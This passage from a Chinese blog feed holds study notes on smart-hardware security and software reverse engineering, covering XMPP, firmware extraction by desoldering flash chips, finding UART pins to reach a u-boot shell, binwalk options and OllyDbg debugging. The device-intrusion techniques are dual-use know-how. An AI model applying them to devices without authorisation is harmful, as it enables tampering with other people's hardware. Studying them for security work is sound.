<h1 id="智能家电设备安全分析"><a href="#智能家电设备安全分析" class="headerlink" title="智能家电设备安全分析"></a>智能家电设备安全分析</h1><h2 id="XMPP协议简介"><a href="#XMPP协议简介" class="headerlink" title="XMPP协议简介"></a>XMPP协议简介</h2><p>XMPP协议（可扩展消息处理现场协议）是一种基于XML的协议，是为解决即时通信标准而提出的。它继承了在XML的协议，是为解决即时通信标准而提出的。基于XMPP的应用具有超强的可扩展性，并且XML很易串货防火墙，所以用XMPP构建的应用不易受到防火墙的阻碍。</p>
<h3 id="XMPP协议的特点"><a href="#XMPP协议的特点" class="headerlink" title="XMPP协议的特点"></a>XMPP协议的特点</h3><blockquote>
<ol>
<li>所有XMPP信息都是以XML为基础的信息交换的实施标准，扩展性强。</li>
<li>XMPP系统是一个分布式系统，每台服务器控制自己的资源。如果需要，它能与外在的系统进行通信。XMPP服务器利用开放的XML协议进行S2S(Server to Server)通信，就像在C2S(Client to Server)一样。</li>
<li>XMPP协议是公开的，程序则开放源代码。</li>
<li>状态消息类型是一直保持连接的。</li>
<li>XMPP允许对所有链接上的客户端和服务端简历并行的TCP套字连接，并通过持久的连接传输数据。</li>
<li>Jabber/XMPP系统是模块化的，而且其设计强调如何实现可伸缩性、安全性和可扩展性。</li>
</ol>
</blockquote>
<h3 id="XMPP协议分析"><a href="#XMPP协议分析" class="headerlink" title="XMPP协议分析"></a>XMPP协议分析</h3><p>XMPP中定义了三个角色：客户端、服务器和网关。</p>
<p>通信能够在这三者的任意两者之间双向发生。</p>
<blockquote>
<p>服务器同时承担了客户端信息的记录、连接管理和信息的路由功能。</p>
<p>网关承担着与异构即时通信系统的互联互通，异构系统可以包括SMS（短信）、MSN、ICQ等。</p>
</blockquote>
<h2 id="安全建议"><a href="#安全建议" class="headerlink" title="安全建议"></a>安全建议</h2><blockquote>
<ol>
<li>对于智能家电产品，多数问题还是处在其云端服务商，例如越权控制、越权绑定设备、以及Web平台上的SQL注入、任意密码找回等传统Web安全漏洞。</li>
<li>对于手机APP端，应当对程序做必要的加固、混淆处理，防止攻击者通过逆向APP分析业务逻辑，解密、篡改传输的数据。</li>
</ol>
</blockquote>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《智能硬件安全》刘键皓 等编著；</em></strong></p>
]]></content>
      <categories>
        <category>智能硬件安全</category>
      </categories>
      <tags>
        <tag>智能硬件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>智能硬件安全_导航</title>
    <url>/%E7%A1%AC%E4%BB%B6%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%E5%AF%BC%E8%88%AA/</url>
    <content><![CDATA[<ol>
<li><h2 id="智能硬件安全-笔记-0X01"><a href="#智能硬件安全-笔记-0X01" class="headerlink" title="智能硬件安全_笔记(0X01)"></a>智能硬件安全_笔记(0X01)</h2><blockquote>
<p>《手机APK终端安全分析法》、《设备固件安全分析方法》</p>
<p><a href="http://www.whh6tl.com/%E7%A1%AC%E4%BB%B6%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8(0x01)/">笔记0X01</a></p>
</blockquote>
</li>
<li><h2 id="智能硬件安全-笔记-0X02"><a href="#智能硬件安全-笔记-0X02" class="headerlink" title="智能硬件安全_笔记(0X02)"></a>智能硬件安全_笔记(0X02)</h2><blockquote>
<p>《网络协议安全分析方法》</p>
<p><a href="http://www.whh6tl.com/%E7%A1%AC%E4%BB%B6%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8(0x02)/">笔记0X02</a></p>
</blockquote>
</li>
<li><h2 id="智能硬件安全-笔记-0X03"><a href="#智能硬件安全-笔记-0X03" class="headerlink" title="智能硬件安全_笔记(0X03)"></a>智能硬件安全_笔记(0X03)</h2><blockquote>
<p>《软件定义无线电安全分析方法》</p>
<p><a href="http://www.whh6tl.com/%E7%A1%AC%E4%BB%B6%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8(0x03)/">笔记0X03</a></p>
</blockquote>
</li>
<li><h2 id="智能硬件安全-笔记-0X04"><a href="#智能硬件安全-笔记-0X04" class="headerlink" title="智能硬件安全_笔记(0X04)"></a>智能硬件安全_笔记(0X04)</h2><blockquote>
<p>《智能电视盒子安全分析》</p>
<p><a href="http://www.whh6tl.com/%E7%A1%AC%E4%BB%B6%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8(0x04)/">笔记0X04</a></p>
</blockquote>
</li>
<li><h2 id="智能硬件安全-笔记-0X05"><a href="#智能硬件安全-笔记-0X05" class="headerlink" title="智能硬件安全_笔记(0X05)"></a>智能硬件安全_笔记(0X05)</h2><blockquote>
<p>《智能汽车安全分析》</p>
<p><a href="http://www.whh6tl.com/%E7%A1%AC%E4%BB%B6%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8(0x05)/">笔记0X05</a></p>
</blockquote>
</li>
<li><h2 id="智能硬件安全-笔记-0X06"><a href="#智能硬件安全-笔记-0X06" class="headerlink" title="智能硬件安全_笔记(0X06)"></a>智能硬件安全_笔记(0X06)</h2><blockquote>
<p>《智能安防类产品安全分析》</p>
<p><a href="http://www.whh6tl.com/%E7%A1%AC%E4%BB%B6%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8(0x06)/">笔记0X06</a></p>
</blockquote>
</li>
<li><h2 id="智能硬件安全-笔记-0X07"><a href="#智能硬件安全-笔记-0X07" class="headerlink" title="智能硬件安全_笔记(0X07)"></a>智能硬件安全_笔记(0X07)</h2><blockquote>
<p>《智能摄像头安全分析》、《智能家电设备安全分析》</p>
<p><a href="http://www.whh6tl.com/%E7%A1%AC%E4%BB%B6%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8(0x07)/">笔记0X07</a></p>
</blockquote>
</li>
</ol>
]]></content>
      <categories>
        <category>智能硬件安全</category>
      </categories>
      <tags>
        <tag>智能硬件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>智能硬件安全_笔记(番外)</title>
    <url>/%E7%A1%AC%E4%BB%B6%E6%99%BA%E8%83%BD%E5%AE%89%E5%85%A8%EF%BC%88%E5%9B%BA%E4%BB%B6%E7%95%AA%E5%A4%96%EF%BC%89_/</url>
    <content><![CDATA[<h2 id="固件概述"><a href="#固件概述" class="headerlink" title="固件概述"></a>固件概述</h2><p>固件就是写入EROM（可擦只读存储器）或EEPROM（点可擦可编程只读存储器）中的程序。</p>
<p>在IoT设备中固件可以说是神经中枢，也可以称作操作系统，它包括很多模块：驱动、控制、解码、传送、检测。</p>
<h2 id="常见固件获取方式"><a href="#常见固件获取方式" class="headerlink" title="常见固件获取方式*"></a>常见固件获取方式*</h2><p>常见的固件获取方式有四种：</p>
<ul>
<li>官网提供固件下载</li>
<li>抓包分析固件更新URL</li>
<li>调试串口获取</li>
<li>暴力读取固件存储芯片数据</li>
</ul>
<p>大部分IoT设备的官网没有直接提供下载链接。通常，可以通过分析手机APP端是否有固件更新功能或者直接抓取终端设备的网络数据包，提取固件更新URL。</p>
<p>很多厂商不提供固件更新，或网络数据强加密使我们不能获取有效固件URL数据。这种情况下，我们可以通过拆卸IoT设备，观察硬件布局和硬件型号推测固件存储设备，采用暴力读取固件存储芯片数据的方式获取固件</p>
<h2 id="从固件存储芯片中读取固件"><a href="#从固件存储芯片中读取固件" class="headerlink" title="从固件存储芯片中读取固件"></a>从固件存储芯片中读取固件</h2><p>一般用到的工具：夹式放大镜、镊子、热风枪拆焊台、焊接台、编程器及相关软件。</p>
<h2 id="Flash芯片中获取固件的基本流程"><a href="#Flash芯片中获取固件的基本流程" class="headerlink" title="Flash芯片中获取固件的基本流程"></a>Flash芯片中获取固件的基本流程</h2><ol>
<li><p>辨别Flash芯片</p>
<blockquote>
<p>辨别Flash芯片的方法：通过放大镜，观看芯片表面型号、电路板表示以及针脚辨别Flash芯片。</p>
</blockquote>
</li>
<li><p>使用吹焊机拆解芯片</p>
<blockquote>
<p>当确认Flash芯片后，使用吹焊机和镊子拆卸芯片，吹焊机一般调节在400度夺走。</p>
</blockquote>
</li>
<li><p>使用编程器获取二进制数据</p>
<blockquote>
<p>吧Flash芯片放入编程器中，将编程器USB口插入计算机，再用编程器软件读取，使用编程器软件之前需要安装驱动。</p>
</blockquote>
</li>
</ol>
<h2 id="调试串口获取shell访问权限"><a href="#调试串口获取shell访问权限" class="headerlink" title="调试串口获取shell访问权限"></a>调试串口获取shell访问权限</h2><ol>
<li><p>寻找串口</p>
<p> 一般情况下，串口至少包含以下四个引脚：</p>
<ul>
<li><p>VCC：电源电压，该引脚表明串口工作电压</p>
</li>
<li><p>GND：接地，该引脚电压通常与PCB地短接</p>
</li>
<li><p>TXD：数据发送引脚</p>
</li>
<li><p>RXD：数据接收引脚</p>
<p>对于没有直接标明串口的PCB主板，在寻找串口时主要步骤为观察和验证</p>
</li>
</ul>
<ol>
<li><p>观察</p>
<blockquote>
<p>通过万用表探测与其他GND短接的引脚，那么这一根就是GND，进而根据电势差寻找VCC.</p>
<p>VCC引脚的特点：</p>
<p>（1）VCC引脚通常被画成方形，其他引脚为圆形。</p>
<p>（2）串口端的VCC电压几乎不是3.3V就是5V。</p>
</blockquote>
</li>
<li><p>验证</p>
<blockquote>
<p>单独引出所怀疑的引脚后分别尝试接到计算机串口的RXD商，给板子供电后查看计算机串口调试工具有误数据或者字符串输出。厂商通常使用的破特率为115200,如果这个波特率下没有数据输出则尝试其他波特率。</p>
<p>如果最终没有输出，则这个结构要么不是串口，要么就是为安全起见固件程序并没有在串口上输出数据。</p>
</blockquote>
<h3 id="获取访问控制权限"><a href="#获取访问控制权限" class="headerlink" title="获取访问控制权限"></a>获取访问控制权限</h3><p>以某款摄像头为例，通过USB-RS232接诶摄像头的串口至PC机，在给摄像头上电后，可以看到PC机串口调试工具显示出的log信息，如下如所示</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://i.loli.net/2020/10/20/H1hBMrpYxtjNiLF.png"></p>
<p>通过打断u-boot引导可以得知摄像头u-boot所支持的一些命令，这些命令可能已经对摄像头构成安全隐患了。</p>
<h2 id="binwalk功能"><a href="#binwalk功能" class="headerlink" title="binwalk功能"></a>binwalk功能</h2></li>
<li><p>过滤功能</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -y xxx.bin</span><br></pre></td></tr></table></figure></li>
<li><p>排除过滤器</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -x xxx(要排除的特征) yyy.bin</span><br></pre></td></tr></table></figure></li>
<li><p>高级过滤器</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -y filesystem -x xxx(要排除的特征) yyy.bin</span><br></pre></td></tr></table></figure></li>
<li><p>递归提取</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -Me xxx.bin</span><br></pre></td></tr></table></figure></li>
<li><p>操作码</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -A xxx.bin</span><br></pre></td></tr></table></figure></li>
<li><p>转换功能</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -l 32 -C xxx.bin</span><br></pre></td></tr></table></figure></li>
<li><p>比较功能</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -W xxx.bin yyy.bin zzz.bin</span><br><span class="line">#相同字节是绿色，不同字节是共色，蓝色是文件中的不同部分</span><br></pre></td></tr></table></figure></li>
<li><p>字符串分析</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -S xxx.bin</span><br></pre></td></tr></table></figure></li>
<li><p>熵分析</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -E xxx.bin</span><br><span class="line">binwalk -AE xxx.bin</span><br></pre></td></tr></table></figure></li>
<li><p>日志记录功能</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">binwalk -f a.log xxx.bin</span><br></pre></td></tr></table></figure>


</li>
</ol>
</li>
</ol>
<p>建PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《智能硬件安全》刘键皓 等编著；</p>
]]></content>
      <categories>
        <category>智能硬件安全</category>
      </categories>
      <tags>
        <tag>智能硬件安全</tag>
      </tags>
  </entry>
  <entry>
    <title>硬件电路构成学习笔记(0X01)</title>
    <url>/%E7%A1%AC%E4%BB%B6%E7%94%B5%E8%B7%AF%E6%9E%84%E6%88%9001/</url>
    <content><![CDATA[<p><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；</em></p>
]]></content>
      <categories>
        <category>硬件电路构成</category>
      </categories>
      <tags>
        <tag>硬件电路构成</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向（基础）学习笔记(0X01)</title>
    <url>/%E9%80%86%E5%90%91-%E5%9F%BA%E7%A1%80-%E7%AC%94%E8%AE%B0_0x01/</url>
    <content><![CDATA[<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="什么是加密与解密"><a href="#什么是加密与解密" class="headerlink" title="什么是加密与解密"></a>什么是加密与解密</h2><h3 id="软件的加密与解密"><a href="#软件的加密与解密" class="headerlink" title="软件的加密与解密"></a>软件的加密与解密</h3><blockquote>
<p>软件的加密与解密技术是矛与盾的关系，它们实在相互竞争中发展进步的。</p>
<p>研究解密技术有助于掌握一些windows的底层技术。</p>
</blockquote>
<h3 id="软件逆向工程"><a href="#软件逆向工程" class="headerlink" title="软件逆向工程"></a>软件逆向工程</h3><blockquote>
<p>逆向工程是根据已有的产物或者结果，通过分析来推导出具体的实现方法。</p>
<p>对软件来说： <strong>“可执行程序  –&gt;  反编译  –&gt;  源代码”</strong>  的过程就是逆向工程</p>
</blockquote>
<p>逆向工程的内容可以分为如下3类：</p>
<ul>
<li>软件使用限制的去除，或者软件功能的增加</li>
<li>软件源代码的再获得</li>
<li>硬件的复制和模拟</li>
</ul>
<h3 id="逆向分析技术"><a href="#逆向分析技术" class="headerlink" title="逆向分析技术"></a>逆向分析技术</h3><ol>
<li><p>通过软件使用说明和操作格式分析软件</p>
<blockquote>
<p>若要分析一个软件，首先应该学习如何使用该软件。首先应详细约定使用手册。</p>
</blockquote>
</li>
<li><p>静态分析技术</p>
<blockquote>
<p>静态分析是指通过<strong>反汇编</strong>得到的程序清单进行分析，最常用的方法是<strong>从提示信息入手</strong>进行分析。</p>
<p>阅读通过静态反汇编得到的程序清单，通过包含提示信息的程序清单，就可以知道提示信息前后的程序片段所完成的功能，从而宏观的了解软件的编程思路。</p>
<p>常用工具有IDA等。</p>
</blockquote>
</li>
<li><p>动态分析技术</p>
<blockquote>
<p>静态分析只是第一步，动态跟踪才是分析软件的关键。动态跟踪的主要工具有<code>OllyDbg</code>，<code>WinDbg</code>等工具。</p>
<p>对软件进行动态分析的意义：</p>
<ol>
<li>许多软件在整体上完成的功能，一般分为多个模块来实现，后一个模块往往需要调用前面模块处理的结果，这一结果叫做<strong>中间结果</strong></li>
<li>许多软件在运行时，其最初执行的模块往往需要对后面的模块进行一些初始化的工作，并不依赖系统的重定位。</li>
<li>许多软件为了阻止非法跟踪，大部分代码都加密，运行时在逐块解密、逐块执行。</li>
</ol>
</blockquote>
<p> 如何有效地进行动态分析：</p>
<ol>
<li><p>软件进行粗跟踪</p>
<blockquote>
<p>所谓粗跟踪，就是在跟踪是要大块大块的跟踪。</p>
<p>在遇到调用指令（CALL），重复操作指令（REF），循环操作指令（LOOP）等时一般不要跟踪，因为太浪费经历，得不偿失。</p>
</blockquote>
</li>
<li><p>对关键部分进行细跟踪</p>
<blockquote>
<p>在对软件进行一定的粗跟踪后，就能获取我们所关系的模块或程序段了，这样就可以有针对性的对该模块进行详细的跟踪分析。</p>
<p>在每次跟踪时把比较关键的中间结果或指令记录下来，对之后的分析会有帮助。</p>
</blockquote>
</li>
</ol>
</li>
</ol>
<h2 id="文本字符"><a href="#文本字符" class="headerlink" title="文本字符"></a>文本字符</h2><p>计算机中存储的信息都是二进制数，屏幕上的内容都是二进制数转换之后的结果。</p>
<h3 id="ASCII与Unicode字符集"><a href="#ASCII与Unicode字符集" class="headerlink" title="ASCII与Unicode字符集"></a>ASCII与Unicode字符集</h3><blockquote>
<p>字符集是一个系统支持的所有抽象字符的集合。字符是所有文字和符号的总称。</p>
<p>ASCII码（美国信息交换标准码）</p>
<p>Unicode是ASCII字符编码的一个扩展，只不过在windows中用2字节对其进行编码，因此也被称为宽字符集</p>
</blockquote>
<h3 id="字节存储顺序"><a href="#字节存储顺序" class="headerlink" title="字节存储顺序"></a>字节存储顺序</h3><blockquote>
<p>endian，翻译为”<strong>字节序</strong>“，表示数据在存储器中的存放顺序，主要分为大端序（Big-endian）和小端序（Little-endian），区别如下：</p>
<ul>
<li>Big-endian：高位字节存入低地址，低位字节存入高地址。</li>
<li>Little-endian：高位字节存入高地址，低位字节存入低地址。</li>
</ul>
<p>一般来说，x86系列CPU都是Little-endian字节序，PowerPC一般都是Big-endian字节序。因为网络协议也是采用Big-endian传输的，所以有事也把Big-endian方式成为网络字节序。</p>
</blockquote>
<h2 id="Windows操作系统"><a href="#Windows操作系统" class="headerlink" title="Windows操作系统"></a>Windows操作系统</h2><h3 id="WIN32-API函数"><a href="#WIN32-API函数" class="headerlink" title="WIN32 API函数"></a>WIN32 API函数</h3><blockquote>
<p>API全称Application Programming Interface（<strong>应用程序编程接口</strong>）</p>
<p>可以认为API接口是整个Windows框架的基石，它的下面是Windows系统核心，它的上面则是Windows应用程序。</p>
<p>用16位Windows 的API称作Win16，32位Windows的API称作win32，64位Windows API的名称和功能基本没有变化，还是使用Win32的函数名，只不过是用64位代码实现的。</p>
<p>Windows运转的核心是动态链接，Windows提供了丰富的应用程序可利用的函数调用，这些函数采用动态链接库（<code>DLL</code>）实现。</p>
<p>Windows的三个子系统：</p>
<ul>
<li>Kernel（由KERNEL32.DLL实现）：操作系统核心服务功能，包括进行与线程控制、内存管理、文件访问等。</li>
<li>User（由USER32.DLL实现）：负责处理用户接口，包括键盘鼠标输入、窗口和菜单管理等。</li>
<li>GDI(由GDI32.DLL实现)：图形设备接口，允许程序在屏幕和打印机上显示文本和图形。</li>
</ul>
<p>其他DLL：</p>
<ul>
<li>对象安全性，注册表操作：ADVAPI32.DLL</li>
<li>通用控件：COMCTL32.DLL</li>
<li>公共对话框：COMDLG32.DLL</li>
<li>用户界面外壳：SHELL32.DLL</li>
<li>网络：NETAPI32.DLL</li>
</ul>
</blockquote>
<h3 id="WOW64"><a href="#WOW64" class="headerlink" title="WOW64"></a>WOW64</h3><blockquote>
<p>WOW64是64位Windows的子系统，可以使大多数32位应用程序在不修改的情况下运行在64位操作系统上</p>
<p>WOW64既不支持16位应用程序的执行，也不支持加载32位内核模式的设备驱动器。</p>
</blockquote>
<h3 id="Windows消息机制"><a href="#Windows消息机制" class="headerlink" title="Windows消息机制"></a>Windows消息机制</h3><blockquote>
<p>Windows是一个消息驱动式系统。</p>
<p>Windows消息提供在应用程序与应用程序之间、应用程序与Windows系统之间进行通信的手段。</p>
<p>Windows系统中有两种消息队列</p>
<ul>
<li>系统消息队列</li>
<li>应用程序消息队列</li>
</ul>
<p>常用的Windows消息函数：</p>
<ol>
<li><p><code>SendMessage</code>函数</p>
<p> <em>调用一个窗口的窗口函数，将一条消息发送给那个窗口。除非消息处理完毕，<strong>否则该函数不会返回</strong>实例函数如下：</em></p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">LRESULT SendMessage(</span><br><span class="line">	HWND hWnd,			&#x2F;&#x2F;目的窗口的句柄</span><br><span class="line">	UNIT Msg，			&#x2F;&#x2F;消息标识符</span><br><span class="line">	WPARAM wParam		&#x2F;&#x2F;消息的WPARAM域</span><br><span class="line">	LPARAM lParam		&#x2F;&#x2F;消息的LPARAM域</span><br><span class="line">);</span><br><span class="line">&#x2F;&#x2F;返回值，由具体的消息决定。如果消息投递成功，则返回TRUE。</span><br></pre></td></tr></table></figure>
</li>
<li><p>WM_COMMAND消息</p>
<p> <em>当用户从菜单或按钮中选择一条命令或者一个控件时，该消息被发送给它的父窗口，或者当一个快捷键被释放时发送。</em></p>
<p> <strong>返回值</strong>：如果应用程序处理这条消息，则返回值为零。</p>
</li>
<li><p>WM_DESTROY消息</p>
<p> <em>当一个窗口被销毁时发送此消息，该消息的16进制数是02h，没有参数</em></p>
<p> <strong>返回值</strong>：如果应用程序处理这条消息，则返回值为零</p>
</li>
<li><p>WM_GETTEXT消息</p>
<p> <em>应用程序发送一条此消息，将一个对应窗口的文本信息复制到一个由呼叫程序提供的缓冲区中。</em></p>
<p> <strong>返回值</strong>：被复制的字符数</p>
</li>
<li><p>WM_QUIT消息</p>
<p> <em>当应用程序调用<code>PostQuitMessage</code>函数时，生成此消息</em></p>
<p> <strong>返回值</strong>：这条消息没有返回值。</p>
</li>
<li><p>WM_LBUTTONDOWN消息</p>
<p> <em>当光标停在一个窗口的客户区并且点下鼠标左键时，此消息将被发送。</em></p>
<p> <strong>返回值</strong>：如果应用程序处理这条消息，则返回值为零。</p>
</li>
</ol>
</blockquote>
<h3 id="虚拟内存"><a href="#虚拟内存" class="headerlink" title="虚拟内存"></a>虚拟内存</h3><blockquote>
<p>虚拟内存不是真正的内存，它通过映射的方法使可用虚拟地址达到4GB，每个应用程序可获得2GB的虚拟地址，剩余的2GB虚拟地址留给操作系统自用。</p>
<p>虚拟内存要点：</p>
<ol>
<li>应用程序不会直接访问物理地址</li>
<li>虚拟内存管理区通过虚拟地址的访问请求来控制所有的物理地址访问</li>
<li>每个应用程序都有独立的4GB寻址空间，不同的应用程序的地址空间是彼此隔离的。</li>
<li>DLL程序没有私有空间，它们总是被映射到其他应用程序的地址空间中，作为其他应用程序的一部分运行。</li>
</ol>
<p>虚拟内存的好处：</p>
<ul>
<li>简化了内存的管理</li>
<li>弥补了物理内存的不足</li>
<li>防止多任务环境下应用程序的冲突</li>
</ul>
</blockquote>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《加密与解密（第4版）》；</em></strong></p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向（基础）</tag>
      </tags>
  </entry>
  <entry>
    <title>逆向（调试）学习笔记(0X01)</title>
    <url>/%E9%80%86%E5%90%91-%E8%B0%83%E8%AF%95-%E7%AC%94%E8%AE%B0_0x01/</url>
    <content><![CDATA[<h1 id="动态分析技术（1）"><a href="#动态分析技术（1）" class="headerlink" title="动态分析技术（1）"></a>动态分析技术（1）</h1><h2 id="OllyDbg调试器"><a href="#OllyDbg调试器" class="headerlink" title="OllyDbg调试器"></a>OllyDbg调试器</h2><p>OllyDbg（简称OD）是一款拥有可视化界面的用户模式调试器。可在任意版本的Windows上运行。</p>
<p>OD结合了静态和动态分析。对异常的跟踪与处理相当灵活。</p>
<p>它的反汇编引擎很强大，可识别数千个被C和Windows频繁使用的函数，并能将其注释出来。</p>
<p>它会自动分析函数过程、循环语句、代码中的字符串等等。</p>
<h3 id="OllyDbg的界面"><a href="#OllyDbg的界面" class="headerlink" title="OllyDbg的界面"></a>OllyDbg的界面</h3><blockquote>
<p>单机“File”–&gt;“Open”选项（快捷键F3）打开一个exe文件，OllyDbg会立刻加载该exe文件，自动分析兵列出汇编代码</p>
<p>默认的当前窗口是CPU窗口，对应的图标是”C”,该窗口包括5个面板窗口，分别是汇编面板、寄存器面板、信息面板、数据面板和栈面板。</p>
</blockquote>
<p><img src= "/img/loading.gif" data-lazy-src="https://raw.githubusercontent.com/whh6tl/img/master/NiXiang/NX-TS-001.png" alt="nx-ts-001"></p>
<ol>
<li><p>反汇编面板窗口</p>
<blockquote>
<p>反汇编面板窗口显示被调试程序的代码，有四列，分别是地址、16进制的机器码、反汇编代码、注释。</p>
<p>（最后一列注释中显示了相关API参数或运行简表）</p>
<p>反汇编面板的列中，双击可完成如下操作：</p>
<ul>
<li>Address列：显示被双击地址的相对地址，再次双击返回标准模式地址。</li>
<li>Hex dump列：设置或取消无条件断点，对应的快捷键是F2</li>
<li>Disassembly列：调用汇编器，可直接修改汇编代码，对应的快捷键是空格键。</li>
<li>Comment列：允许增加或编辑注释，对应的快捷键是“；”键。</li>
</ul>
</blockquote>
</li>
<li><p>信息面板窗口</p>
<blockquote>
<p>在进行动态跟踪时，信息面板窗口将显示与指令相关的各寄存器的值、API函数调用提示和跳转提示等信息。</p>
</blockquote>
</li>
<li><p>数据面板窗口</p>
<blockquote>
<p>数据面板窗口以16进制和字符的形式，显示文件在内存中的数据。</p>
<p>要显示指定地址内存数据，可单机右键快捷菜单中的“Go to expression”命令或按“Ctrl+G”快捷键，打开地址窗口，输入地址。</p>
</blockquote>
</li>
<li><p>寄存器面板窗口</p>
<blockquote>
<p>显示CPU各寄存器的值，支持浮点、MMX和3DNow！寄存器</p>
</blockquote>
</li>
<li><p>栈面板窗口</p>
<blockquote>
<p>显示栈的内容，即ESP指向地址的内容。将数据放入栈的操作叫入栈（push），取出的动作叫出栈（pop）。</p>
<p>（栈窗口非常重要）各API函数和子程序都利用它传递参数和变量等。</p>
</blockquote>
</li>
</ol>
<h3 id="OllyDbg的配置"><a href="#OllyDbg的配置" class="headerlink" title="OllyDbg的配置"></a>OllyDbg的配置</h3><p>设置项在“Options”菜单里，有界面选项（Appearance）和调试选项（Debugging Options），这些选项的配置都保存在ollydbg.ini文件里。</p>
<blockquote>
<p>UDD路径：保存调试信息，方便下次继续调试</p>
<p>插件路径：存放插件</p>
</blockquote>
<h3 id="基本操作"><a href="#基本操作" class="headerlink" title="基本操作"></a>基本操作</h3><p>（专门为解密联系制作的小程序，一般统称为CrackMe）</p>
<p>为了让OllyDbg终端在程序的入口点，在加载程序前进行相应的设置：</p>
<ol>
<li>运行OllyDbg，单击“Options”–&gt;“Debugging options”选项，打开调试选项配置对话框</li>
<li>单击“Event“标签，设置OllyDbg对终端入口点、模块加载/卸载、线程创建/结束等事件的处理方式，一般只需要将断点设置在”**<code>WinMain</code>**“处。</li>
<li>设置完成后，打开CrackMe.exe，此时OllyDbg会中断在TrackMe.exe第一条指令处。，调试器等待用户下一步指令。</li>
</ol>
<p>下图各部分代码的含义如下：</p>
<ul>
<li>虚拟地址：在一般情况下，同一程序的同一指令在不同环境下此值相同。</li>
<li>机器码：就是CPU执行的机器代码。</li>
<li>汇编指令：与机器码对应的程序代码</li>
</ul>
<p><img src= "/img/loading.gif" data-lazy-src="https://github.com/whh6tl/img/blob/master/NiXiang/NX-TS-002.png?raw=true" alt="NX-TS-002"></p>
<p><strong>单步跟踪：</strong></p>
<p>调试器的一个最基本的功能就是动态跟踪。OllyDbg在“Debug”菜单里控制运行的命令，各个菜单都有相应的快捷键</p>
<p><img src= "/img/loading.gif" data-lazy-src="https://github.com/whh6tl/img/blob/master/NiXiang/NX-TS-003.png?raw=true" alt="nx-ts-003"></p>
<p>“call 00401DA0”表示调用00101DA0处的子程序。一旦子程序调用完成，就会返回call指令的下一条指令。</p>
<p><strong>设置断点</strong></p>
<p>断点（breakpoint）可以让程序中断在指定的地方，从而更方便的对其进行调试，将鼠标移到地址处，按<strong>F2</strong>即可设置断点，再次按F2即可取消断点。</p>
<p>设置断点后，按<strong>“Alt+B”</strong>快捷键或者点击“B”按钮，打开断电窗口，查看断点明细。</p>
<p><strong>Ctrl+G</strong>：跟随表达式窗口。</p>
<p><strong>调试分析</strong></p>
<p>按“F8”单步走出函数。”Alt+F9“快捷键回到调用函数的地方</p>
<blockquote>
<p><strong>阅读代码时注意的点</strong>：</p>
<ul>
<li>清楚各API函数的定义</li>
<li>API函数大多采用_stdcall调用约定，即函数入口参数从右到左顺序入栈，由<strong>被调用者</strong>清理栈中的参数，返回值存放在<strong>eax</strong>中，对相关API函数，要注意push指令。</li>
<li>C代码中的子程序采用C调用约定，函数入口参数从右到左顺序入栈，由<strong>调用者</strong>清理栈中的参数</li>
</ul>
</blockquote>
<h3 id="常用断点"><a href="#常用断点" class="headerlink" title="常用断点"></a>常用断点</h3><blockquote>
<p>常用断点主要有INT3断点、硬件断点、内存断点、消息断点等。</p>
</blockquote>
<h4 id="INT3断点"><a href="#INT3断点" class="headerlink" title="INT3断点"></a><strong>INT3断点</strong></h4><blockquote>
<p><code>F2</code>设置的断点就是INT3断点，也叫作<code>CC</code>断点</p>
<p>原理：替换为INT3指令、OD检测到INT3指令后引发一个异常，并且补货它，这时候程序就会中断，将INT3指令给删除掉，还原之前的代码。</p>
<p>优点：无限的下INT3断点</p>
<p>缺点：很容易被检测。</p>
</blockquote>
<h4 id="硬件断点"><a href="#硬件断点" class="headerlink" title="硬件断点"></a><strong>硬件断点</strong></h4><blockquote>
<p>跟调试寄存器有关，DR0~DR7,</p>
<p>地址栏右键 –&gt; 断点 –&gt; 硬件执行。</p>
<p><strong>查看</strong>：调试 –&gt; 硬件断点</p>
<p><strong>原理</strong>：</p>
<ol>
<li>DR0~DR3：保存需要断点的地址</li>
<li>DR6：状态寄存器</li>
<li>DR7：（控制寄存器）设置相对于的控制位</li>
<li>当程序运行到断点的时候，CPU像OD发送异常信息，然后程序中断，等待用户操作。</li>
</ol>
<p>优点：速度快，不容易被检测（不修改代码）</p>
<p>缺点：只能下四个硬件断点</p>
</blockquote>
<h4 id="内存断点"><a href="#内存断点" class="headerlink" title="内存断点"></a><strong>内存断点</strong></h4><blockquote>
<p>原理：将原来的属性改为不可读写执行，程序会产生异常，OD就会捕获，然后程序中断</p>
<p>地址栏右键 –&gt; 断点 –&gt; 内存访问/写入。     </p>
<p>优点：不改变汇编代码</p>
</blockquote>
<p><strong><em>PS:本文仅是学习笔记，将自己认为重要的点记录下来；学习的途径是《加密与解密（第4版）》；</em></strong></p>
]]></content>
      <categories>
        <category>逆向</category>
      </categories>
      <tags>
        <tag>逆向（调试）</tag>
      </tags>
  </entry>
  <entry>
